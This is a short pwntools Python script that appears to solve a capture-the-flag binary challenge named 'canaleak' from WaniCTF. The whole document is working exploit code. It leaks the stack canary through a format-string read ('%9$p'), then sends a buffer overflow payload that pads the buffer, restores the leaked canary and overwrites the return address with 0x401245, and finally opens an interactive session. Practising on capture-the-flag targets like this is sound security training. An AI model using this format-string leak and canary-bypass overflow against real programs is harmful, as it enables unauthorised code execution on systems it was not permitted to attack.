from pwn import *

r = process("./chall")
#r = remote("canaleak-pwn.wanictf.org",9006)
r.recvuntil(b"You can't overwrite return address if canary is enabled.\n")
r.recv()
r.sendline("%9$p")  # canary leak
canary = int(r.recvline(), 16)
log.info(f'Canary: {hex(canary)}')

payload = b"A"*24  # padding for buffer
payload += p64(canary)  # canary
payload += b"B"*8  # padding to rbp
payload += p64(0x401245)  # addr load rdi

r.sendline(payload)
r.sendlineafter(b" : ", b"YES")
r.interactive()
# FLAG{N0PE!}
